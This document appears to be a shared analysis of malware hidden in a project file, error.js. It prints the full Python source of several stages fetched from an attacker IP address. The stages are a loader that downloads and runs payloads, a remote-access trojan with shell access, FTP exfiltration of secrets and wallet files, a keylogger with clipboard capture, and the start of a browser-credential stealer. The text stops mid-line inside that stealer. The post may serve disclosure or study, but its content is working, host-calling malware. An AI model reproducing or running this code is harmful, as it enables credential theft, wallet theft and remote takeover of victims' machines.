Source file from /dice_front-end_user/authentication/middlewares/helpers/error.js.
You must scroll down to see the content of malicious codes.

I used to pretty the codes, not sure if they were actually deobfuscated.
https://obf-io.deobfuscate.io/

---

# http://95.164.17.24:1224/client/5346
```python
import base64, platform, os, subprocess, sys

try:
    import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

sType = "5346"
gType = "root"
ot = platform.system()
home = os.path.expanduser("~")
# host1 = "10.10.51.212"
host1 = "95.164.17.24"
host2 = f"http://{host1}:1224"
pd = os.path.join(home, ".n2")
ap = pd + "/pay"


def download_payload():
    if os.path.exists(ap):
        try:
            os.remove(ap)
        except OSError:
            return True
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass

    try:
        if ot == "Darwin":
            # aa = requests.get(host2+"/payload1/"+sType+"/"+gType, allow_redirects=True)
            aa = requests.get(
                host2 + "/payload/" + sType + "/" + gType, allow_redirects=True
            )
            with open(ap, "wb") as f:
                f.write(aa.content)
        else:
            aa = requests.get(
                host2 + "/payload/" + sType + "/" + gType, allow_redirects=True
            )
            with open(ap, "wb") as f:
                f.write(aa.content)
        return True
    except Exception as e:
        return False


res = download_payload()
if res:
    if ot == "Windows":
        subprocess.Popen(
            [sys.executable, ap],
            creationflags=subprocess.CREATE_NO_WINDOW
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        subprocess.Popen([sys.executable, ap])

if ot == "Darwin":
    sys.exit(-1)

ap = pd + "/bow"


def download_browse():
    if os.path.exists(ap):
        try:
            os.remove(ap)
        except OSError:
            return True
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass
    try:
        aa = requests.get(host2 + "/brow/" + sType + "/" + gType, allow_redirects=True)
        with open(ap, "wb") as f:
            f.write(aa.content)
        return True
    except Exception as e:
        return False


res = download_browse()
if res:
    if ot == "Windows":
        subprocess.Popen(
            [sys.executable, ap],
            creationflags=subprocess.CREATE_NO_WINDOW
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        subprocess.Popen([sys.executable, ap])
```

# http://95.164.17.24:1224/payload/5346/root

```python
import base64, socket
from uuid import getnode
from requests import get, post
from hashlib import sha256
from getpass import getuser
from platform import system, node, release, version
import time

sType = "5346"
gType = "root"


class System(object):
    def __init__(A):
        A.system = system()
        if gType == "root":
            A.hostname = node()
        else:
            A.hostname = gType + "_" + node()
        A.release = release()
        A.version = version()
        A.username = getuser()
        A.uuid = A.get_id()

    def get_id(A):
        return sha256((str(getnode()) + getuser()).encode()).digest().hex()

    def sys_info(A):
        return {
            "uuid": A.uuid,
            "system": A.system,
            "release": A.release,
            "version": A.version,
            "hostname": A.hostname,
            "username": A.username,
        }


class Geo(object):
    def __init__(A):
        A.geo = A.get_geo()
        A.internal_ip = A.get_internal_ip()

    def get_internal_ip(A):
        try:
            return socket.gethostbyname_ex(hn)[-1][-1]
        except:
            return ""

    def get_geo(A):
        try:
            return get("http://ip-api.com/json").json()
        except:
            pass

    def net_info(A):
        g = A.get_geo()
        if g:
            ii = A.internal_ip
            if ii:
                g["internalIp"] = ii
        return g


class Information(object):
    def __init__(A):
        A.net_info = Geo().net_info()
        A.sys_info = System().sys_info()

    def parse(K, data):
        J = "regionName"
        I = "country"
        H = "query"
        G = "city"
        F = "isp"
        E = "zip"
        D = "lon"
        C = "lat"
        B = "timezone"
        _A = "internalIp"
        A = data
        A = {
            C: A[C] if C in A else "",
            D: A[D] if D in A else "",
            E: A[E] if E in A else "",
            F: A[F] if F in A else "",
            G: A[G] if G in A else "",
            H: A[H] if H in A else "",
            I: A[I] if I in A else "",
            B: A[B] if B in A else "",
            J: A[J] if J in A else "",
            _A: A[_A] if _A in A else "",
        }
        if "/" in A[B]:
            A[B] = A[B].replace("/", " ")
        if "_" in A[B]:
            A[B] = A[B].replace("_", " ")
        return A

    def get_info(A):
        B = A.net_info
        return {"sys_info": A.sys_info, "net_info": A.parse(B if B else [])}


host = "LjE3LjI0OTUuMTY0"
# host="  NTEuMjEy  MTAuMTAu"
PORT = 1224
HOST = base64.b64decode(host[8:] + host[:8]).decode()
if gType == "root":
    hn = socket.gethostname()
else:
    hn = gType + "_" + socket.gethostname()


class Comm(object):
    def __init__(A):
        A.sys_info = Information().get_info()

    def contact_server(A, ip, port):
        A.ip, A.port = ip, int(port)
        B = int(time.time() * 1000)
        C = {
            "ts": str(B),
            "type": sType,
            "hid": hn,
            "ss": "sys_info",
            "cc": str(A.sys_info),
        }
        D = f"http://{A.ip}:{A.port}/keys"
        try:
            post(D, data=C)
        except Exception as e:
            pass


def run_comm():
    c = Comm()
    c.contact_server(HOST, PORT)
    del c


run_comm()

import base64, platform, socket
from time import sleep
from socket import timeout as TimeOutError
import time
from datetime import datetime, timezone, timedelta
import json, os, struct, subprocess
from threading import Thread, RLock, Timer
import requests, ftplib
import ast

sHost = socket.gethostname()
host = "LjE3LjI0OTUuMTY0"
# host="  NTEuMjEy  MTAuMTAu"
_T = True
_F = False
_N = None
_A = "admin"
_O = "output"


class Session(object):
    def __init__(A, sock):
        A.sock = sock
        A.info = {"type": 0, "group": sType, "name": sHost}

    def shutdown(A):
        try:
            A.sendall("[close]")
            A.sock.shutdown(socket.SHUT_RDWR)
            A.sock.close()
        except:
            pass

    def connect(A, ip, port):
        A.sock.connect((ip, port))
        sleep(0.5)
        A.send(code=0, args=A.info)
        sleep(0.5)
        return _T

    def struct(A, code=_N, args=_N):
        return json.dumps({"code": code, "args": args})

    def send(A, code=_N, args=_N):
        d = A.struct(code, args)
        A.sendall(d)

    def sendall(A, data):
        try:
            try:
                ii = data.encode()
            except:
                ii = data
            ii = struct.pack(">I", len(ii)) + ii
            A.sock.sendall(ii)
        except:
            pass

    def recv(A):
        try:
            print("start ses recv")
            ll = A.recvall(4)
            print("ses recv size:", ll)
            if not ll:
                return _N
            ml = struct.unpack(">I", ll)[0]
            print("ses recv:", ml)
            # Read the message datacls
            return A.recvall(ml)
        except TimeOutError:
            return -1
        except:
            pass

    def recvall(A, size):
        try:
            d = bytearray()
            while len(d) < size:
                pt = A.sock.recv(size - len(d))
                if not pt:
                    return _N
                d.extend(pt)
            return d
        except:
            return _N


e_buf = ""


def decode_str(ss):
    try:
        r = ss.decode("utf8")
        return r
    except:
        try:
            r = ss.decode("cp1252")
            return r
        except:
            try:
                r = ss.decode("mac_roman")
                return r
            except:
                return ss


ex_files = [
    ".exe",
    ".dll",
    ".msi",
    ".dmg",
    ".iso",
    ".pkg",
    ".apk",
    ".xapk",
    ".aar",
    ".ap_",
    ".aab",
    ".dex",
    ".class",
    ".rpm",
    ".deb",
    ".ipa",
    ".dsym",
    ".mp4",
    ".avi",
    ".mp3",
    ".wmv",
    ".wma",
    ".mov",
    ".webm",
    ".avchd",
    ".mkv",
    ".ogg",
    ".mpe",
    ".mpv",
    ".mpeg",
    ".m4p",
    ".m4a",
    ".m4v",
    ".aac",
    ".flac",
    ".aiff",
    ".qt",
    ".flv",
    ".swf",
    ".pyc",
    ".lock",
    ".psd",
    ".pack",
    ".old",
    ".ppt",
    ".pptx",
    ".virtualization",
    ".indd",
    ".eps",
    ".ai",
    ".a",
    ".jar",
    ".so",
    ".o",
    ".wt",
    ".lib",
    ".dylib",
    ".bin",
    ".ffx",
    ".svg",
    ".css",
    ".scss",
    ".gem",
    ".html",
]
ex_dirs = [
    "vendor",
    "Pods",
    "node_modules",
    ".git",
    ".next",
    ".externalNativeBuild",
    "sdk",
    ".idea",
    "cocos2d",
    "compose",
    "proj.ios_mac",
    "proj.android-studio",
    "Debug",
    "Release",
    "debug",
    "release",
    "obj",
    "Obj",
    "xcuserdata",
    ".gradle",
    "build",
    "storage",
    ".android",
    "Program Files (x86)",
    "$RECYCLE.BIN",
    "Program Files",
    "Windows",
    "ProgramData",
    "cocoapods",
    "homebrew",
    ".svn",
    "sbin",
    "standalone",
    "local",
    "ruby",
    "man",
    "zsh",
    "Volumes",
    "Applications",
    "Library",
    "System",
    "Pictures",
    "Desktop",
    "usr",
    "android",
    "var",
    "__pycache__",
    ".angular",
    "cache",
    ".nvm",
    ".yarn",
    ".docker",
    ".local",
    ".vscode",
    ".cache",
    "__MACOSX",
    ".pyp",
    ".gem",
    ".config",
    ".rustup",
    ".pyenv",
    ".rvm",
    ".sdkman",
    ".nix-defexpr",
    ".meteor",
    ".nuget",
    ".cargo",
    ".vscode-insiders",
    ".gemexport",
    ".Bin",
    ".oh-my-zsh",
    ".rbenv",
    ".ionic",
    ".mozilla",
    ".var",
    ".cocoapods",
    ".flipper",
    ".forever",
    ".quokka",
    ".continue",
    ".pub-cache",
    ".debris",
    "jdk",
    ".wine32",
    ".phpls",
    ".typeChallenges",
    ".sonarlint",
    ".aptos",
    ".bluemix",
    ".bundle",
    ".cabal",
    ".changes",
    ".changeset",
    ".circleci",
    ".cp",
    ".cpanm",
    ".cxx",
    ".dart_tool",
    ".dartServer",
    ".dbvis",
    ".deps",
    ".devcontainer",
    ".dotnet",
    ".dropbox.cache",
    ".dthumb",
    ".ebcli-virtual-env",
    ".eclipse",
    "eclipse",
    ".electrum",
    ".executables",
    ".exp",
    ".ghcup",
    ".github",
    ".gnupg",
    ".hash",
    ".hasura",
    ".IdentityService",
    ".indexes",
    ".install",
    ".install4j",
    ".kokoro",
    ".localized",
    ".npm",
    ".node-gyp",
    ".p2",
    ".platformio",
    ".plugin_symlinks",
    ".plugins",
    ".store",
    ".storybook",
    ".tmp",
    "tmp",
    ".turbo",
    ".versions",
    ".vs",
    ".vscode-server",
    ".yalc",
    "!azure",
    "x-pack",
    "lib64",
    "site-packages",
    "node_modules12",
    "kibana-8.5.0",
    "google-cloud-sdk",
    "golang.org",
    "Assets.xcassets",
    "arduino",
]
pat_envs = [
    ".env",
    "config.js",
    "secret",
    "metamask",
    "wallet",
    "private",
    "mnemonic",
    "password",
    "account",
    ".xls",
    ".xlsx",
    ".doc",
    ".docx",
    ".rtf",
]
ex1_files = [
    ".php",
    ".svg",
    ".htm",
    ".hpp",
    ".cpp",
    ".xml",
    ".png",
    ".swift",
    ".ccb",
    ".jsx",
    ".tsx",
    ".h",
    ".java",
]
ex2_files = [
    "tsconfig.json",
    "tailwind.config.js",
    "svelte.config.js",
    "next.config.js",
    "babel.config.js",
    "vite.config.js",
    "webpack.config.js",
    "postcss.config.js",
    "robots.txt",
    "license.txt",
    ".ds_store",
    ".angular-config.json",
    "package-lock.json",
]


def ld(rd, pd):
    dir = os.path.join(rd, pd)
    res = []
    res.append((pd, ""))
    sa = os.listdir(dir)
    for x in sa:
        fn = os.path.join(dir, x)
        try:
            x0 = x.lower()
            if os.path.isfile(fn):
                ff, fe = os.path.splitext(x0)
                if not fe in ex_files and os.path.getsize(fn) < 104857600:
                    res.append((pd, x))
            elif os.path.isdir(fn):
                if not x in ex_dirs and not x0 in ex_dirs:
                    if pd != "":
                        t = pd + "/" + x
                    else:
                        t = x
                    res = res + ld(rd, t)
        except:
            pass
    return res


def ld0(rd, pd):
    dir = os.path.join(rd, pd)
    res = []
    res.append((pd, ""))
    sa = os.listdir(dir)
    for x in sa:
        if (
            x == ex_dirs[0]
            or x == ex_dirs[1]
            or x == ex_dirs[2]
            or x == ex_dirs[3]
            or x == ex_dirs[4]
        ):
            continue
        try:
            fn = os.path.join(dir, x)
            if os.path.isfile(fn):
                res.append((pd, x))
            elif os.path.isdir(fn):
                if pd != "":
                    t = pd + "/" + x
                else:
                    t = x
                res = res + ld0(rd, t)
        except:
            pass
    return res


def ld1(rd, pd, pat):
    D = pat
    B = pd
    if D == "":
        return []
    dir = os.path.join(rd, B)
    res = []
    res.append((B, ""))
    S = os.listdir(dir)
    for x in S:
        fn = os.path.join(dir, x)
        try:
            x0 = x.lower()
            if os.path.isfile(fn):
                ff, fe = os.path.splitext(x0)
                if not fe in ex_files and os.path.getsize(fn) < 104857600:
                    if x0.find(D) >= 0:
                        res.append((B, x))
            elif os.path.isdir(fn):
                if not x in ex_dirs and not x0 in ex_dirs:
                    if B != "":
                        t = B + "/" + x
                    else:
                        t = x
                    res = res + ld1(rd, t, D)
        except:
            pass
    return res


def fmt_s(s):
    if s < 1024:
        return str(s) + "B"
    elif s < 1048576:
        return "{:.0f}KB".format(s / 1024.0)
    elif s < 1073741824:
        return "{:.1f}MB".format(s / 1048576.0)
    else:
        return "{:.1f}GB".format(s / 1073741824.0)


def FM(f, d):
    try:
        f.mkd(d)
    except:
        pass


os_type = platform.system()


class Shell(object):
    def __init__(A, S):
        A.sess = S
        A.is_alive = _T
        A.is_delete = _F
        A.lock = RLock()
        A.timeout_count = 0
        A.cp_stop = 0
        A.par_dir = os.path.join(os.path.expanduser("~"), ".n2")
        A.cmds = {
            1: A.ssh_obj,
            2: A.ssh_cmd,
            3: A.ssh_clip,
            4: A.ssh_run,
            5: A.ssh_upload,
            6: A.ssh_kill,
            7: A.ssh_any,
            8: A.ssh_env,
        }
        print("init success")

    def listen_recv(A):
        while A.is_alive:
            try:
                print("start listen")
                recv = A.sess.recv()
                print("listen recv:", recv)
                if recv == -1:
                    if A.timeout_count < 30:
                        A.timeout_count += 1
                        continue
                    else:
                        A.timeout_count = 0
                        recv = _N
                if recv:
                    A.timeout_count = 0
                    with A.lock:
                        D = json.loads(recv)
                        c = D["code"]
                        args = D["args"]
                        try:
                            if c != 2:
                                args = ast.literal_eval(args)
                        except:
                            pass
                        if c in A.cmds:
                            tg = A.cmds[c]
                            t = Thread(target=tg, args=(args,))
                            t.start()  # tg(args)
                        else:
                            if A.is_alive:
                                A.is_alive = _F
                                A.close()
                else:
                    if A.is_alive:
                        A.timeout_count = 0
                        A.is_alive = _F
                        A.close()
            except Exception as ex:
                print("error_listen:", ex)

    def shell(A):
        print("start shell")
        t1 = Thread(target=A.listen_recv)
        t1.daemon = _T
        t1.start()
        while A.is_alive:
            try:
                sleep(5)
            except:
                break
        A.close()
        return A.is_delete

    def send(A, code=_N, args=_N):
        A.sess.send(code=code, args=args)

    def sendall(A, m):
        A.sess.sendall(m)

    def close(A):
        A.is_alive = _F
        A.sess.shutdown()

    def send_n(A, a, n, o):
        p = {_A: a, _O: o}
        A.send(code=n, args=p)

    def ssh_cmd(A, args):
        try:
            if args == "delete":
                o = "[close]"
            else:
                return
        except Exception as e:
            o = f"Error_cmd: {e}"
        try:
            A.sendall(o)
            A.is_delete = _T
            A.sock.shutdown(socket.SHUT_RDWR)
            A.sock.close()
        except:
            pass

    def ssh_obj(A, args):
        o = ""
        try:
            a = args[_A]
            cmd = args["cmd"]
            if cmd == "":
                o = ""
            elif cmd.split()[0] == "cd":
                proc = subprocess.Popen(cmd, shell=_T)
                if len(cmd.split()) != 1:
                    p = " ".join(cmd.split()[1:])
                    if os.path.exists(p):
                        os.chdir(p)
                o = os.getcwd()
            else:
                proc = subprocess.Popen(
                    cmd,
                    shell=_T,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                ).communicate()
                try:
                    o = decode_str(proc[0])
                    err = decode_str(proc[1])
                except:
                    o = proc[0]
                    err = proc[1]
                o = o if o else err
        except:
            pass
        p = {_A: a, _O: o}
        A.send(code=1, args=p)

    def ssh_clip(A, args):
        global e_buf
        try:
            A.send(code=3, args=e_buf)
            e_buf = ""
        except:
            pass

    def down_bro(A, p):
        if os.path.exists(p):
            try:
                os.remove(p)
            except OSError:
                return _T
        try:
            if not os.path.exists(A.par_dir):
                os.makedirs(A.par_dir)
        except:
            pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(
                host2 + "/brow/" + sType + "/" + gType, allow_redirects=_T
            )
            with open(p, "wb") as f:
                f.write(myfile.content)
            return _T
        except Exception as e:
            return _F

    def ssh_run(A, args):
        try:
            a = args[_A]
            p = A.par_dir + "/bow"
            res = A.down_bro(p)
            if res:
                if os_type == "Windows":
                    subprocess.Popen(
                        [sys.executable, p],
                        creationflags=subprocess.CREATE_NO_WINDOW
                        | subprocess.CREATE_NEW_PROCESS_GROUP,
                    )
                else:
                    subprocess.Popen([sys.executable, p])
            o = os_type + " get browse"
        except Exception as e:
            o = f"Err4: {e}"
            pass
        p = {_A: a, _O: o}
        A.send(code=4, args=p)

    def send_5(A, a, o):
        A.send_n(a, 5, o)

    def ssh_upload(A, args):
        o = ""
        try:
            D = args[_A]
            cmd = args["cmd"]
            cmd = ast.literal_eval(cmd)
            if "sdira" in cmd:
                sdir = cmd["sdira"]
                dn = cmd["dname"]
                sdir = sdir.strip()
                dn = dn.strip()
                A.ss_upa(D, cmd, sdir, dn)
                return _T
            elif "sdir" in cmd:
                sdir = cmd["sdir"]
                dn = cmd["dname"]
                sdir = sdir.strip()
                dn = dn.strip()
                A.ss_upd(D, cmd, sdir, dn)
                return _T
            elif "sfile" in cmd:
                sfile = cmd["sfile"]
                dn = cmd["dname"]
                sfile = sfile.strip()
                dn = dn.strip()
                A.ss_upf(D, cmd, sfile, dn)
                return _T
            elif "sfinda" in cmd:
                sdir = cmd["sfinda"]
                dn = cmd["dname"]
                pat = cmd["pat"]
                sdir = sdir.strip()
                dn = dn.strip()
                pat = pat.strip()
                A.ss_ufind(D, cmd, sdir, dn, pat)
                return _T
            elif "sfind" in cmd:
                dn = cmd["dname"]
                pat = cmd["pat"]
                dn = dn.strip()
                pat = pat.strip()
                A.ss_ufind(D, cmd, ".", dn, pat)
                return _T
            else:
                A.ss_ups()
                o = "Stopped ..."
        except Exception as e:
            print("error_upload:", str(e))
            o = f"Err4: {e}"
            pass
        A.send_5(D, o)

    def o_ftp(A, args, name):
        hn = args["hn"]
        un = args["un"]
        pw = args["pw"]
        f = ftplib.FTP(hn, un, pw)
        f.encoding = "utf-8"
        d = "DA" + sType
        FM(f, d)
        d = d + "/" + sHost
        FM(f, d)
        d = d + "/" + name
        FM(f, d)
        return (f, d)

    def s_ft(A, G, t, sd, rd, x, y):
        sn = os.path.join(sd, x, y)
        dn = rd + "/" + x + "/" + y
        try:
            with open(sn, "rb") as f:
                t.storbinary(f"STOR {dn}", f)
                o = (
                    " copied "
                    + fmt_s(os.fstat(f.fileno()).st_size)
                    + ":  "
                    + x
                    + " "
                    + y
                )
                f.close()
                A.send_5(G, o)
        except Exception as e:
            o = " failed: " + sn + " > " + str(e)
            A.send_5(G, o)

    def ss_upd(A, D, args, sd, name):
        A.cp_stop = 0
        t = _N
        try:
            if sd == ".":
                sd = os.getcwd()
            A.send_5(D, " >> upload start: " + sd)
            res = ld(sd, "")
            A.send_5(D, "  -count: " + str(len(res)))
            (t, rd) = A.o_ftp(args, name)
            for (x, y) in res:
                if A.cp_stop == 1:
                    A.send_5(D, " upload stopped ")
                    return
                if y == "":
                    dn = rd + "/" + str(x)
                    FM(t, dn)
                else:
                    A.s_ft(D, t, sd, rd, x, y)
            t.close()
            A.send_5(D, " uploaded success ")
        except Exception as ex:
            if t is not _N:
                t.close()
            o = " copy error :" + str(ex)
            A.send_5(D, o)

    def ss_upa(A, D, args, sd, name):
        A.cp_stop = 0
        t = _N
        try:
            if sd == ".":
                sd = os.getcwd()
            A.send_5(D, " >> upload all start: " + sd)
            res = ld0(sd, "")
            A.send_5(D, "  -counts: " + str(len(res)))
            (t, rd) = A.o_ftp(args, name)
            for (x, y) in res:
                if A.cp_stop == 1:
                    A.send_5(D, " upload stopped ")
                    return
                if y == "":
                    dn = rd + "/" + str(x)
                    FM(t, dn)
                else:
                    A.s_ft(D, t, sd, rd, x, y)
            t.close()
            A.send_5(D, " uploaded success ")
        except Exception as ex:
            if t is not _N:
                t.close()
            print("error_upa:", str(ex))
            o = " copy error :" + str(ex)
            A.send_5(D, o)

    def ss_upf(A, admin, args, sfile, name):
        D = admin
        A.cp_stop = 0
        t = _N
        try:
            sdir = os.getcwd()
            A.send_5(D, " >> upload start: " + sdir + " " + sfile)
            (t, rd) = A.o_ftp(args, name)
            sn = os.path.join(sdir, sfile)
            dn = rd + "/" + sfile
            try:
                with open(sn, "rb") as f:
                    t.storbinary(f"STOR {dn}", f)
                    o = " copied " + fmt_s(os.fstat(f.fileno()).st_size) + ":  " + sfile
                    f.close()
                    A.send_5(D, o)
            except Exception as e:
                o = " failed: " + sn + " > " + str(e)
                A.send_5(D, o)
            t.close()
            A.send_5(D, " uploaded done ")
        except Exception as ex:
            if t is not _N:
                t.close()
            o = " copy error :" + str(ex)
            A.send_5(D, o)

    def ss_ufind(A, D, args, sd, name, pat):
        A.cp_stop = 0
        t = _N
        try:
            if sd == ".":
                sd = os.getcwd()
            A.send_5(D, " >> ufind start: " + sd)
            res = ld1(sd, "", pat)
            A.send_5(D, "  -count: " + str(len(res)))
            (t, rd) = A.o_ftp(args, name)
            for (x, y) in res:
                if A.cp_stop == 1:
                    A.send_5(D, " ufind stopped ")
                    return
                if y == "":
                    dn = rd + "/" + str(x)
                    FM(t, dn)
                else:
                    A.s_ft(D, t, sd, rd, x, y)
            t.close()
            A.send_5(D, " ufind success ")
        except Exception as ex:
            if t is not _N:
                t.close()
            o = " copy error :" + str(ex)
            A.send_5(D, o)

    def ss_ups(A):
        A.cp_stop = 1

    def f_up(A, a, t, sd, dd, x, y):
        try:
            dn = dd
            for i in x.split("/"):
                dn = os.path.join(dn, i)
                if i not in t.nlst(os.path.dirname(dn)):
                    t.mkd(dn)
            sn = os.path.join(sd, x, y)
            dn = dd + "/" + x + "/" + y
            with open(sn, "rb") as f:
                t.storbinary(f"STOR {dn}", f)
                f.close()
        except:
            pass

    def ss_ld(A, a, t, sd, dd, pd):
        dir = os.path.join(sd, pd)
        sa = os.listdir(dir)
        res = []
        for x in sa:
            fn = os.path.join(dir, x)
            try:
                x0 = x.lower()
                if os.path.isfile(fn):
                    ff, fe = os.path.splitext(x0)
                    if (
                        not x0 in ex2_files
                        and not fe in ex_files
                        and not fe in ex1_files
                        and os.path.getsize(fn) < 20971520
                    ):
                        for p in pat_envs:
                            if x0.find(p) >= 0:
                                A.f_up(a, t, sd, dd, x=pd, y=x)
                                res.append((sd, pd, x))
                                break
                elif os.path.isdir(fn):
                    if not x in ex_dirs and not x0 in ex_dirs:
                        if pd != "":
                            p = pd + "/" + x
                        else:
                            p = x
                        res += A.ss_ld(a, t, sd, dd, p)
            except:
                pass
        return res

    def ssh_env(A, args):
        try:
            a = args[_A]
            c = args["cmd"]
            c = ast.literal_eval(c)
            A.send_n(a, 8, "--- uenv start ")
            (t, dd) = A.o_ftp(c, "env_" + str(int(time.time())))

            if os_type == "Windows":
                hd = os.path.expanduser("~")
                dd1 = dd + "/doc"
                FM(t, dd1)
                # A.send_n(a,8,'>> '+hd+'\\Documents')
                A.ss_ld(a, t, hd + "\\Documents", dd1, "")
                dd1 = dd + "/down"
                FM(t, dd1)
                # A.send_n(a,8,'>> '+hd+'\\Downloads')
                A.ss_ld(a, t, hd + "\\Downloads", dd1, "")

                for i in range(68, 73):
                    C = chr(i)
                    dd1 = dd + "/" + C
                    FM(t, dd1)
                    # A.send_n(a,8,'>> '+dd1)
                    A.ss_ld(a, t, C + ":", dd1, "")
            else:
                hd = os.path.expanduser("~")
                dd1 = dd + "/home"
                FM(t, dd1)
                A.ss_ld(a, t, hd, dd1, "")

                hd = "/Volumes"
                dd1 = dd + "/vol"
                FM(t, dd1)
                A.ss_ld(a, t, hd, dd1, "")
            t.close()
            A.send_n(a, 8, "--- uenv success ")
        except Exception as e:
            A.send_n(a, 8, " uenv err: " + str(e))

    def ssh_kill(A, args):
        D = args[_A]
        if os_type == "Windows":
            try:
                subprocess.Popen("taskkill /IM chrome.exe /F")
            except:
                pass
            try:
                subprocess.Popen("taskkill /IM brave.exe /F")
            except:
                pass
        else:
            try:
                subprocess.Popen("killall Google\ Chrome")
            except:
                pass
            try:
                subprocess.Popen("killall Brave\ Browser")
            except:
                pass
        p = {_A: D, _O: "Chrome & Browser are terminated"}
        A.send(code=6, args=p)

    def down_any(A, p):
        if os.path.exists(p):
            try:
                os.remove(p)
            except OSError:
                return _T
        try:
            if not os.path.exists(A.par_dir):
                os.makedirs(A.par_dir)
        except:
            pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2 + "/adc/" + sType, allow_redirects=_T)
            with open(p, "wb") as f:
                f.write(myfile.content)
            return _T
        except Exception as e:
            return _F

    def ssh_any(A, args):
        try:
            D = args[_A]
            p = A.par_dir + "/adc"
            res = A.down_any(p)
            if res:
                if os_type == "Windows":
                    subprocess.Popen(
                        [sys.executable, p],
                        creationflags=subprocess.CREATE_NO_WINDOW
                        | subprocess.CREATE_NEW_PROCESS_GROUP,
                    )
                else:
                    subprocess.Popen([sys.executable, p])
            o = os_type + " get anydesk"
        except Exception as e:
            o = f"Err7: {e}"
            pass
        p = {_A: D, _O: o}
        A.send(code=7, args=p)


HOST0 = base64.b64decode(host[8:] + host[:8]).decode()
PORT0 = 2245


class Client:
    def __init__(A):
        A.server_ip = HOST0
        A.server_port = PORT0
        A.is_active = _F
        A.is_alive = _T
        A.timeout_count = 0
        A.shell = _N

    @property
    def make_connection(A):
        while _T:
            try:
                A.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s = Session(A.client_socket)
                s.connect(A.server_ip, A.server_port)
                A.shell = Shell(s)
                A.is_active = _T
                if A.shell.shell():
                    try:
                        dir = os.getcwd()
                        print("dir:", dir)
                        fn = os.path.join(dir, sys.argv[0])
                        print("fn:", fn)
                        os.remove(fn)
                    except Exception as ex:
                        print("connection error:", ex)
                        pass
                    return _T
                sleep(15)
            except Exception as e:
                print("error_make:", e)
                sleep(20)
                pass

    def run(A):
        if A.make_connection:
            return


client = Client()
import sys

is_w = sys.platform.startswith("win")
if __name__ == "__main__":
    if is_w == _F:
        try:
            client.run()
        except KeyboardInterrupt:
            pass
        sys.exit(0)

_M = "-m"
_P = "pip"
_L = "install"
import subprocess

try:
    import pyWinhook as pyHook
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pyWinhook"])
    import pyWinhook as pyHook
try:
    import pyperclip
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pyperclip"])
    import pyperclip
try:
    import psutil
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "psutil"])
    import psutil
try:
    import win32process
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32process
try:
    import pythoncom
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import pythoncom
try:
    import win32gui
except:
    subprocess.check_call([sys.executable, _M, _P, _L, "pywin32"])
    import win32gui


def act_win_pn():
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return (pid[-1], psutil.Process(pid[-1]).name())
    except:
        pass


def write_txt(text):
    0


c_win = 0


def check_window(event):
    global c_win
    if c_win != event.Window:
        (pid, text) = act_win_pn()
        tz = timezone(offset=timedelta(hours=9))
        d_t = datetime.fromtimestamp(time.time(), tz)
        t_s = d_t.strftime("%m/%d/%Y, %H:%M:%S")

        c_win = event.Window
        return f"\n**\n-[ {text} | PID: {pid}-{c_win}\n-[ @ {t_s} | {event.WindowName}\n**\n"
    return ""


m_win = 0


def hmld(event):
    global e_buf, m_win
    if m_win != event.Window:
        m_win = event.Window
        tt = "<..>"
    else:
        tt = "<.>"
    e_buf += tt
    write_txt(tt)
    return _T


def hmrd(event):
    global e_buf, m_win
    if m_win != event.Window:
        m_win = event.Window
        tt = "<,,>"
    else:
        tt = "<,>"
    e_buf += tt
    write_txt(tt)
    return _T


def is_down(status):
    if status == 128:
        return _T
    return _F


def is_control_down():
    return (
        is_down(pyHook.GetKeyState(0x11))
        or is_down(pyHook.GetKeyState(0xA2))
        or is_down(pyHook.GetKeyState(0xA3))
    )


def run_copy_clipboard():
    global e_buf
    try:
        copied = pyperclip.waitForPaste(0.05)
        tt = "\n=================BEGIN================\n"
        tt += copied
        tt += "\n==================END==================\n"
        e_buf += tt
        write_txt(tt)
    except Exception as ex:
        pass


def hkb(event):
    if event.KeyID == 0xA2 or event.KeyID == 0xA3:
        return _T

    global e_buf
    tt = check_window(event)

    key = event.Ascii
    if is_control_down():
        key = f"<^{event.Key}>"
    elif key == 0xD:
        key = "\n"
    else:
        if key >= 32 and key <= 126:
            key = chr(key)
        else:
            key = f"<{event.Key}>"
    tt += key
    if is_control_down() and event.Key == "C":
        start_time = Timer(0.1, run_copy_clipboard)
        start_time.start()
    elif is_control_down() and event.Key == "V":
        start_time = Timer(0.1, run_copy_clipboard)
        start_time.start()

    e_buf += tt
    write_txt(tt)
    return _T


def startHk():
    hm = pyHook.HookManager()
    hm.MouseLeftDown = hmld
    hm.MouseRightDown = hmrd
    hm.KeyDown = hkb
    hm.HookMouse()
    hm.HookKeyboard()


def hk_loop():
    startHk()
    pythoncom.PumpMessages()


def run_client():
    t1 = Thread(target=hk_loop)
    t1.daemon = _T
    t1.start()
    try:
        client.run()
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    run_client()
```

# http://95.164.17.24:1224/brow/5346/root

```python
from typing import Union, Type
from datetime import datetime, timedelta
from pathlib import Path
import base64, socket, os, re, json, sqlite3, shutil, time, platform, subprocess, sys, socket, os, re

_m = "-m"
_pp = "pip"
_inl = "install"
os_type = platform.system()
if os_type == "Windows":
    try:
        import win32crypt
    except:
        subprocess.check_call([sys.executable, _m, _pp, _inl, "pywin32"])

try:
    import requests
except:
    subprocess.check_call([sys.executable, _m, _pp, _inl, "requests"])
    import requests
try:
    from Crypto.Hash import SHA1
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Cipher import AES
except:
    subprocess.check_call([sys.executable, _m, _pp, _inl, "pycryptodome"])
    from Crypto.Hash import SHA1
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Cipher import AES
if os_type == "Linux":
    try:
        import secretstorage
    except:
